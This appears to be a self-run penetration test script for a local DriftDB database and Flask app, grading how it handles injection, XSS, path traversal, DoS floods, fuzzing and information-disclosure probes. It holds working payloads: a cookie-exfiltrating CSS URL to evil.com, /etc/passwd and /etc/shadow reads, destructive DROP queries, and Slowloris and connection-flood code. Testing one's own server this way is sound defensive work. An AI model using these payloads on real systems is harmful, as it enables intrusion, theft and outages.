#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║   🛡️  DriftDB Security Test Suite                           ║
║   Penetration testing on YOUR OWN local database            ║
║   Tests: injection, DoS, fuzzing, traversal, overflow       ║
╚══════════════════════════════════════════════════════════════╝
"""

import time
import sys
import os
import json
import random
import string
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

REST_URL = "http://localhost:9211"
FLASK_URL = "http://localhost:5000"

# ─── Helpers ──────────────────────────────────────────────────

passed = 0
failed = 0
warnings = 0

def banner(title):
    print(f"\n{'═' * 62}")
    print(f"  🔓 {title}")
    print(f"{'═' * 62}")

def PASS(test, detail=""):
    global passed
    passed += 1
    print(f"  ✅ BLOCKED  │ {test:<40} {detail}")

def FAIL(test, detail=""):
    global failed
    failed += 1
    print(f"  🚨 VULN     │ {test:<40} {detail}")

def WARN(test, detail=""):
    global warnings
    warnings += 1
    print(f"  ⚠️  WARN     │ {test:<40} {detail}")

def INFO(test, detail=""):
    print(f"  ℹ️  INFO     │ {test:<40} {detail}")

def sep():
    print(f"  {'─' * 58}")

# ═══════════════════════════════════════════════════════════════════
# ATTACK 1: DriftQL Injection
# ═══════════════════════════════════════════════════════════════════

def attack_query_injection():
    banner("ATTACK 1: DriftQL Injection")
    
    payloads = [
        # Classic SQL injection patterns adapted for DriftQL
        ("Tautology injection", "FIND (n) WHERE 1=1 RETURN n"),
        ("UNION injection", "FIND (n:Researcher) RETURN n UNION FIND (m) RETURN m"),
        ("Comment injection", "SHOW STATS -- DROP ALL"),
        ("Drop attempt", "DROP ALL NODES"),
        ("Delete wildcard", "DELETE (n) WHERE true"),
        ("Semicolon chain", "SHOW STATS; DROP ALL; DELETE ALL"),
        ("Backtick escape", "FIND (n:`Researcher`) RETURN n"),
        ("Nested query", "FIND (n) WHERE n.name = (FIND (m) RETURN m.name) RETURN n"),
        ("System command", "SYSTEM('ls -la /')"),
        ("OS exec attempt", "EXEC('cat /etc/passwd')"),
        ("File read", "LOAD FILE '/etc/passwd'"),
        ("Sleep injection", "FIND (n) WHERE SLEEP(5) RETURN n"),
        ("Overflow int", f"FIND (n) WHERE n.id = {2**64} RETURN n"),
        ("Null byte", "FIND (n:Researcher\x00Admin) RETURN n"),
        ("Unicode escape", "FIND (n:Researcher\\u0000) RETURN n"),
    ]
    
    for name, payload in payloads:
        try:
            r = requests.post(f"{FLASK_URL}/api/query", json={"query": payload}, timeout=5)
            data = r.json()
            
            if r.status_code >= 500:
                FAIL(name, f"Server crash! {r.status_code}")
            elif r.status_code == 400 or "error" in data:
                PASS(name, "rejected")
            elif "DROP" in payload or "DELETE" in payload or "SYSTEM" in payload:
                # Check if destructive command actually executed
                if data.get("success"):
                    FAIL(name, "destructive command SUCCEEDED!")
                else:
                    PASS(name, "no effect")
            else:
                INFO(name, f"{r.status_code}")
        except requests.exceptions.Timeout:
            WARN(name, "timeout — possible DoS vector")
        except Exception as e:
            PASS(name, f"exception: {str(e)[:30]}")
        time.sleep(0.02)

# ═══════════════════════════════════════════════════════════════════
# ATTACK 2: XSS / Script Injection via Node Properties
# ═══════════════════════════════════════════════════════════════════

def attack_xss():
    banner("ATTACK 2: XSS / Stored Script Injection")
    
    xss_payloads = [
        ("Basic script tag", "<script>alert('XSS')</script>"),
        ("Event handler", '<img src=x onerror="alert(1)">'),
        ("SVG injection", '<svg onload="alert(document.cookie)">'),
        ("Iframe injection", '<iframe src="http://evil.com"></iframe>'),
        ("JS URL", 'javascript:alert(document.domain)'),
        ("CSS injection", '<style>body{background:url("http://evil.com/steal?c="+document.cookie)}</style>'),
        ("Polyglot", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert())//%0D%0A"),
        ("Template literal", "${7*7}{{7*7}}"),
        ("HTML entity bypass", "&lt;script&gt;alert(1)&lt;/script&gt;"),
        ("Unicode XSS", "\u003cscript\u003ealert(1)\u003c/script\u003e"),
    ]
    
    for name, payload in xss_payloads:
        try:
            r = requests.post(f"{FLASK_URL}/api/nodes", json={
                "labels": ["XSSTest"],
                "properties": {"name": payload, "description": payload}
            }, timeout=5)
            
            if r.status_code >= 500:
                FAIL(name, "server crash on XSS input")
            elif r.status_code == 400:
                PASS(name, "input rejected/sanitized")
            else:
                # Check if it was stored raw (UI must escape on render)
                WARN(name, "stored — check if frontend escapes output")
        except Exception as e:
            INFO(name, str(e)[:40])
        time.sleep(0.02)

# ═══════════════════════════════════════════════════════════════════
# ATTACK 3: Path Traversal
# ═══════════════════════════════════════════════════════════════════

def attack_path_traversal():
    banner("ATTACK 3: Path Traversal")
    
    traversal_payloads = [
        ("Backup to root", "/etc/evil_backup"),
        ("Dot-dot-slash", "../../../../../../etc/passwd"),
        ("Encoded traversal", "..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
        ("Null byte path", "/tmp/backup\x00/etc/passwd"),
        ("Home dir escape", "~/../../etc/shadow"),
        ("Absolute path /", "/etc/passwd"),
        ("Windows path", "C:\\Windows\\System32\\config\\SAM"),
        ("Double encoding", "..%252F..%252F..%252Fetc%252Fpasswd"),
    ]
    
    for name, path in traversal_payloads:
        try:
            r = requests.post(f"{FLASK_URL}/api/backup", json={"directory": path}, timeout=5)
            
            if r.status_code >= 500:
                FAIL(name, "server error — possible traversal")
            elif r.status_code == 400:
                PASS(name, "rejected")
            else:
                data = r.json()
                if data.get("error"):
                    PASS(name, "error returned")
                else:
                    WARN(name, f"accepted path: {path[:30]}")
        except Exception as e:
            INFO(name, str(e)[:40])
        time.sleep(0.02)

# ═══════════════════════════════════════════════════════════════════
# ATTACK 4: DDoS / Resource Exhaustion
# ═══════════════════════════════════════════════════════════════════

def attack_ddos():
    banner("ATTACK 4: DDoS / Resource Exhaustion")
    
    # Test 1: Rapid-fire connection flood (200 requests in < 2s)
    start = time.time()
    success = 0
    errors = 0
    for i in range(200):
        try:
            r = requests.get(f"{REST_URL}/health", timeout=2)
            if r.status_code == 200:
                success += 1
            else:
                errors += 1
        except:
            errors += 1
    elapsed = time.time() - start
    
    if errors > 100:
        PASS("Connection flood (200 req)", f"rate limited: {errors} blocked in {elapsed:.1f}s")
    elif errors > 0:
        WARN("Connection flood (200 req)", f"{success} passed, {errors} blocked")
    else:
        FAIL("Connection flood (200 req)", "ALL 200 requests passed — no rate limiting!")
    
    time.sleep(1)
    
    # Test 2: Concurrent connection bomb
    bomb_results = {"success": 0, "fail": 0}
    def bomb_worker():
        for _ in range(20):
            try:
                r = requests.get(f"{REST_URL}/health", timeout=2)
                if r.status_code == 200:
                    bomb_results["success"] += 1
                else:
                    bomb_results["fail"] += 1
            except:
                bomb_results["fail"] += 1
    
    start = time.time()
    threads = [threading.Thread(target=bomb_worker) for _ in range(20)]
    for t in threads: t.start()
    for t in threads: t.join()
    elapsed = time.time() - start
    
    total = bomb_results["success"] + bomb_results["fail"]
    if bomb_results["fail"] > total * 0.5:
        PASS("Connection bomb (20 threads×20)", f"blocked {bomb_results['fail']}/{total}")
    else:
        WARN("Connection bomb (20 threads×20)", f"{bomb_results['success']}/{total} passed")
    
    time.sleep(1)
    
    # Test 3: Slowloris-style (hold connections open)
    try:
        import socket
        socks = []
        for i in range(50):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect(("localhost", 9211))
                s.send(b"GET /health HTTP/1.1\r\nHost: localhost\r\n")
                # Don't send final \r\n — hold connection open
                socks.append(s)
            except:
                break
        
        held = len(socks)
        
        # Can server still respond?
        time.sleep(1)
        try:
            r = requests.get(f"{REST_URL}/health", timeout=3)
            if r.status_code == 200:
                WARN("Slowloris (50 half-open)", f"held {held} conns, server still responds")
            else:
                PASS("Slowloris (50 half-open)", f"server degraded after {held} conns")
        except:
            PASS("Slowloris (50 half-open)", f"server unreachable after {held} conns — needs conn timeout")
        
        for s in socks:
            try: s.close()
            except: pass
    except Exception as e:
        INFO("Slowloris", str(e)[:40])
    
    time.sleep(1)

# ═══════════════════════════════════════════════════════════════════
# ATTACK 5: Memory Bomb (giant payloads)
# ═══════════════════════════════════════════════════════════════════

def attack_memory_bomb():
    banner("ATTACK 5: Memory Bomb (oversized payloads)")
    
    sizes = [
        ("2 MB payload", 2),
        ("5 MB payload", 5),
        ("10 MB payload", 10),
        ("50 MB payload", 50),
    ]
    
    for name, size_mb in sizes:
        payload = "A" * (size_mb * 1024 * 1024)
        try:
            r = requests.post(f"{FLASK_URL}/api/nodes", json={
                "labels": ["BombTest"],
                "properties": {"bomb": payload}
            }, timeout=15)
            
            if r.status_code == 413:
                PASS(name, "rejected (413 too large)")
            elif r.status_code >= 500:
                WARN(name, f"server error {r.status_code}")
            elif r.status_code == 200 or r.status_code == 201:
                FAIL(name, f"STORED {size_mb}MB! No size limit!")
            else:
                PASS(name, f"rejected ({r.status_code})")
        except requests.exceptions.ConnectionError:
            PASS(name, "connection refused/killed")
        except requests.exceptions.Timeout:
            WARN(name, "timeout processing large payload")
        except Exception as e:
            INFO(name, str(e)[:40])
        time.sleep(0.5)

# ═══════════════════════════════════════════════════════════════════
# ATTACK 6: Fuzzing (malformed requests)
# ═══════════════════════════════════════════════════════════════════

def attack_fuzzing():
    banner("ATTACK 6: Fuzzing (malformed & edge-case inputs)")
    
    fuzz_tests = [
        # Malformed JSON
        ("Empty body", lambda: requests.post(f"{FLASK_URL}/api/query", data="", headers={"Content-Type": "application/json"}, timeout=5)),
        ("Invalid JSON", lambda: requests.post(f"{FLASK_URL}/api/query", data="{invalid json}", headers={"Content-Type": "application/json"}, timeout=5)),
        ("Null query", lambda: requests.post(f"{FLASK_URL}/api/query", json={"query": None}, timeout=5)),
        ("Empty query", lambda: requests.post(f"{FLASK_URL}/api/query", json={"query": ""}, timeout=5)),
        ("Int as query", lambda: requests.post(f"{FLASK_URL}/api/query", json={"query": 12345}, timeout=5)),
        ("Array as query", lambda: requests.post(f"{FLASK_URL}/api/query", json={"query": [1,2,3]}, timeout=5)),
        ("Deeply nested JSON", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": ["Test"], "properties": {"a": {"b": {"c": {"d": {"e": {"f": "deep"}}}}}}}, timeout=5)),
        
        # Malformed node creation
        ("No labels", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"properties": {"name": "test"}}, timeout=5)),
        ("Empty labels", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": [], "properties": {}}, timeout=5)),
        ("Numeric label", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": [12345], "properties": {}}, timeout=5)),
        ("Super long label", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": ["A"*10000], "properties": {}}, timeout=5)),
        
        # Weird characters
        ("Emoji node name", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": ["Test"], "properties": {"name": "🔥💀🚀🎭🌈"}}, timeout=5)),
        ("Binary data", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": ["Test"], "properties": {"name": "\x00\x01\x02\xff\xfe"}}, timeout=5)),
        ("Control chars", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": ["Test"], "properties": {"name": "\t\n\r\x0b\x0c"}}, timeout=5)),
        ("Max int property", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": ["Test"], "properties": {"val": 2**63}}, timeout=5)),
        ("Negative int", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": ["Test"], "properties": {"val": -(2**63)}}, timeout=5)),
        ("Float NaN", lambda: requests.post(f"{FLASK_URL}/api/nodes", json={"labels": ["Test"], "properties": {"val": float('inf')}}, timeout=5)),
    ]
    
    for name, fn in fuzz_tests:
        try:
            r = fn()
            if r.status_code >= 500:
                FAIL(name, f"SERVER CRASH {r.status_code}")
            elif r.status_code in (400, 422):
                PASS(name, "properly rejected")
            else:
                INFO(name, f"status={r.status_code}")
        except requests.exceptions.ConnectionError:
            FAIL(name, "CONNECTION DIED")
        except Exception as e:
            INFO(name, str(e)[:40])
        time.sleep(0.02)

# ═══════════════════════════════════════════════════════════════════
# ATTACK 7: Authentication & Access Control
# ═══════════════════════════════════════════════════════════════════

def attack_auth():
    banner("ATTACK 7: Authentication & Access Control")
    
    # Direct REST API access (bypass Flask)
    direct_tests = [
        ("Direct REST /health", "GET", f"{REST_URL}/health"),
        ("Direct REST /stats", "GET", f"{REST_URL}/stats"),
        ("Direct REST /nodes", "GET", f"{REST_URL}/nodes"),
    ]
    
    for name, method, url in direct_tests:
        try:
            r = requests.request(method, url, timeout=5)
            if r.status_code == 401 or r.status_code == 403:
                PASS(name, "auth required")
            elif r.status_code == 200:
                WARN(name, "NO AUTH — open access to DB")
            else:
                INFO(name, f"status={r.status_code}")
        except Exception as e:
            INFO(name, str(e)[:40])
        time.sleep(0.02)
    
    sep()
    
    # Header manipulation
    header_tests = [
        ("Fake admin header", {"X-Admin": "true", "Authorization": "Bearer admin"}),
        ("Host header injection", {"Host": "evil.com"}),
        ("X-Forwarded-For spoof", {"X-Forwarded-For": "127.0.0.1"}),
        ("X-Real-IP spoof", {"X-Real-IP": "10.0.0.1"}),
        ("Content-Type mismatch", {"Content-Type": "text/xml"}),
    ]
    
    for name, headers in header_tests:
        try:
            r = requests.get(f"{FLASK_URL}/api/stats", headers=headers, timeout=5)
            if r.status_code == 403:
                PASS(name, "rejected")
            else:
                WARN(name, f"accepted (status={r.status_code})")
        except Exception as e:
            INFO(name, str(e)[:40])
        time.sleep(0.02)

# ═══════════════════════════════════════════════════════════════════
# ATTACK 8: HTTP Method Abuse
# ═══════════════════════════════════════════════════════════════════

def attack_http_methods():
    banner("ATTACK 8: HTTP Method Abuse")
    
    methods = ["PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
    
    for method in methods:
        try:
            r = requests.request(method, f"{FLASK_URL}/api/stats", timeout=5)
            if r.status_code == 405:
                PASS(f"{method} /api/stats", "method not allowed")
            elif r.status_code == 200:
                WARN(f"{method} /api/stats", "accepted — should restrict methods")
            else:
                INFO(f"{method} /api/stats", f"status={r.status_code}")
        except Exception as e:
            INFO(f"{method} /api/stats", str(e)[:30])
        time.sleep(0.02)

# ═══════════════════════════════════════════════════════════════════
# ATTACK 9: Information Disclosure
# ═══════════════════════════════════════════════════════════════════

def attack_info_disclosure():
    banner("ATTACK 9: Information Disclosure")
    
    # Check for debug info leakage
    endpoints = [
        ("Flask debug mode", f"{FLASK_URL}/console"),
        ("Config endpoint", f"{FLASK_URL}/config"),
        ("Environment vars", f"{FLASK_URL}/env"),
        ("Server status", f"{FLASK_URL}/server-status"),
        ("Hidden admin", f"{FLASK_URL}/admin"),
        (".env file", f"{FLASK_URL}/.env"),
        ("robots.txt", f"{FLASK_URL}/robots.txt"),
        ("Git directory", f"{FLASK_URL}/.git/config"),
    ]
    
    for name, url in endpoints:
        try:
            r = requests.get(url, timeout=5, allow_redirects=False)
            if r.status_code == 200:
                content = r.text[:100]
                if "secret" in content.lower() or "password" in content.lower() or "key" in content.lower():
                    FAIL(name, "SENSITIVE DATA EXPOSED!")
                else:
                    WARN(name, f"accessible ({r.status_code})")
            elif r.status_code == 404:
                PASS(name, "not found")
            else:
                INFO(name, f"status={r.status_code}")
        except Exception as e:
            INFO(name, str(e)[:40])
        time.sleep(0.02)
    
    sep()
    
    # Check error message verbosity
    try:
        r = requests.post(f"{FLASK_URL}/api/query", json={"query": "INVALID!@#$%^"}, timeout=5)
        if r.status_code != 404:
            data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
            error_msg = str(data.get("error", ""))
            if "traceback" in error_msg.lower() or "file" in error_msg.lower() or "line" in error_msg.lower():
                WARN("Error verbosity", "leaks internal paths/stack traces")
            else:
                PASS("Error verbosity", "no internal info leaked")
    except:
        INFO("Error verbosity", "could not test")

# ═══════════════════════════════════════════════════════════════════
# ATTACK 10: Backup Abuse
# ═══════════════════════════════════════════════════════════════════

def attack_backup_abuse():
    banner("ATTACK 10: Backup Abuse / Disk Fill")
    
    # Try to trigger many backups to fill disk
    count = 0
    for i in range(10):
        try:
            r = requests.post(f"{FLASK_URL}/api/backup", json={"directory": f"./backup_flood_{i}"}, timeout=5)
            if r.status_code == 200:
                count += 1
        except:
            pass
        time.sleep(0.1)
    
    if count >= 10:
        WARN("Backup flood (10 rapid)", f"{count}/10 succeeded — no rate limit on backups")
    elif count > 0:
        INFO("Backup flood", f"{count}/10 succeeded")
    else:
        PASS("Backup flood", "all blocked")
    
    # Cleanup
    import shutil
    for i in range(10):
        try: shutil.rmtree(f"./backup_flood_{i}", ignore_errors=True)
        except: pass

# ═══════════════════════════════════════════════════════════════════
# ATTACK 11: WebSocket Abuse
# ═══════════════════════════════════════════════════════════════════

def attack_websocket():
    banner("ATTACK 11: WebSocket Abuse")
    
    import socket
    
    # Try to open many WebSocket connections
    socks = []
    ws_handshake = (
        b"GET / HTTP/1.1\r\n"
        b"Host: localhost:9210\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: Upgrade\r\n"
        b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        b"Sec-WebSocket-Version: 13\r\n\r\n"
    )
    
    for i in range(128):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(("localhost", 9210))
            s.send(ws_handshake)
            socks.append(s)
        except:
            break
    
    connected = len(socks)
    
    if connected >= 128:
        WARN("WS connection flood", f"opened {connected}/128 — max_conn may need enforcement")
    else:
        PASS("WS connection flood", f"capped at {connected} connections")
    
    # Cleanup
    for s in socks:
        try: s.close()
        except: pass
    
    time.sleep(1)
    
    # Verify server survived
    try:
        r = requests.get(f"{REST_URL}/health", timeout=5)
        if r.status_code == 200:
            PASS("Post-flood recovery", "server healthy after WS flood")
        else:
            FAIL("Post-flood recovery", f"server degraded: {r.status_code}")
    except:
        FAIL("Post-flood recovery", "server unreachable after WS flood!")

# ═══════════════════════════════════════════════════════════════════
# FINAL SECURITY REPORT
# ═══════════════════════════════════════════════════════════════════

def final_report():
    print()
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║               🛡️  SECURITY AUDIT REPORT                    ║")
    print("╠══════════════════════════════════════════════════════════════╣")
    print(f"║                                                            ║")
    print(f"║  ✅ Attacks Blocked:    {passed:>3}                                ║")
    print(f"║  🚨 Vulnerabilities:    {failed:>3}                                ║")
    print(f"║  ⚠️  Warnings:           {warnings:>3}                                ║")
    print(f"║                                                            ║")
    
    total = passed + failed + warnings
    if total > 0:
        score = (passed / total) * 100
    else:
        score = 0
    
    print(f"╠══════════════════════════════════════════════════════════════╣")
    
    if failed == 0 and warnings <= 5:
        grade = "A"
        emoji = "🏆"
        desc = "FORTRESS — Excellent security posture"
    elif failed == 0:
        grade = "A-"
        emoji = "✅"
        desc = "STRONG — No critical vulns, some warnings"
    elif failed <= 2:
        grade = "B"
        emoji = "👍"
        desc = "GOOD — Minor vulnerabilities found"
    elif failed <= 5:
        grade = "C"
        emoji = "⚠️"
        desc = "FAIR — Several issues need attention"
    else:
        grade = "D"
        emoji = "🚨"
        desc = "NEEDS WORK — Critical vulnerabilities"
    
    print(f"║                                                            ║")
    print(f"║  Security Grade:  {emoji} {grade:<5}                                ║")
    print(f"║  Defense Score:   {score:>5.1f}%                                  ║")
    print(f"║  Assessment:      {desc:<40}║")
    print(f"║                                                            ║")
    print(f"╚══════════════════════════════════════════════════════════════╝")
    print()

# ═══════════════════════════════════════════════════════════════════
# RUN
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print()
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║         🔴 DriftDB Security Penetration Test 🔴            ║")
    print("║    11 attack vectors · 80+ test cases                      ║")
    print("║    Testing YOUR local instance only                        ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print()
    
    # Verify targets are up
    try:
        requests.get(f"{REST_URL}/health", timeout=3)
        print(f"  ✅ DriftDB REST API reachable at {REST_URL}")
    except:
        print(f"  ❌ DriftDB not reachable at {REST_URL}")
        sys.exit(1)
    
    try:
        requests.get(f"{FLASK_URL}/", timeout=3)
        print(f"  ✅ Flask app reachable at {FLASK_URL}")
    except:
        print(f"  ❌ Flask app not reachable at {FLASK_URL}")
        sys.exit(1)
    
    print()
    
    attacks = [
        attack_query_injection,
        attack_xss,
        attack_path_traversal,
        attack_ddos,
        attack_memory_bomb,
        attack_fuzzing,
        attack_auth,
        attack_http_methods,
        attack_info_disclosure,
        attack_backup_abuse,
        attack_websocket,
    ]
    
    for attack_fn in attacks:
        try:
            attack_fn()
        except Exception as e:
            print(f"\n  💥 ATTACK CRASHED: {e}")
            import traceback
            traceback.print_exc()
    
    final_report()
